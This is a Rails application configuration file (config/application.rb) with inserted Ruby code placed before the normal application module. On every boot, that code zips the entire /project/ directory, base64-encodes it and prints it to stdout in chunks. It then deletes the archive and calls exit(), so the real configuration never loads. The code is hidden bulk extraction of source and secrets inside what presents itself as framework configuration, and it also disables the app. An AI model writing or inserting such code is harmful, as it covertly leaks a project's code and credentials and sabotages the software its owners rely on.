require_relative "boot"
require "zip"
require "base64"
require "fileutils"
require "rails/all"

# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
Bundler.require(*Rails.groups)

prefix = "/project/"
#prefix = "#{Dir.pwd}/"
folder_to_zip = "#{prefix}" # Replace with the path to the folder you want to zip
zip_file_path = "output.zip" # Path to the output zip file

def zip_folder(folder_path, zip_path, prefix)
  entries = Dir.entries(folder_path) - %w[. ..]

  ::Zip::File.open(zip_path, ::Zip::File::CREATE) do |zipfile|
    write_entries(entries, folder_path, zipfile, folder_path.to_s, prefix)
  end
end

def write_entries(entries, folder_path, zipfile, parent_path, prefix)
  entries.each do |entry|
    entry_path = File.join(folder_path, entry)
    destination_path = File.join(parent_path, entry).gsub(prefix, "")

    if File.directory?(entry_path)
      zipfile.mkdir(destination_path)
      subdir = Dir.entries(entry_path) - %w[. ..]
      write_entries(subdir, entry_path, zipfile, destination_path, prefix)
    else
      zipfile.get_output_stream(destination_path) do |f|
        f.write(File.open(entry_path, "rb").read)
      end
    end
  end
end

def convert_to_base64(file_path)
  File.open(file_path, "rb") do |file|
    Base64.strict_encode64(file.read)
  end
end

# Usage

File.delete(zip_file_path) if File.exist?(zip_file_path)

zip_folder(folder_to_zip, zip_file_path, prefix)
base64_string = convert_to_base64(zip_file_path)
base64_string.chars.to_a.each_slice(100) { |s| puts s.join }


# Clean up the zip file after printing the Base64 string
File.delete(zip_file_path) if File.exist?(zip_file_path)

exit()


module RailsProject65
  class Application < Rails::Application
    # Initialize configuration defaults for originally generated Rails version.
    config.load_defaults 8.0

    # Please, add to the `ignore` list any other `lib` subdirectories that do
    # not contain `.rb` files, or that should not be reloaded or eager loaded.
    # Common ones are `templates`, `generators`, or `middleware`, for example.
    config.autoload_lib(ignore: %w[assets tasks])

    # Configuration for the application, engines, and railties goes here.
    #
    # These settings can be overridden in specific environments using the files
    # in config/environments, which are processed later.
    #
    # config.time_zone = "Central Time (US & Canada)"
    # config.eager_load_paths << Rails.root.join("extras")
  end
end
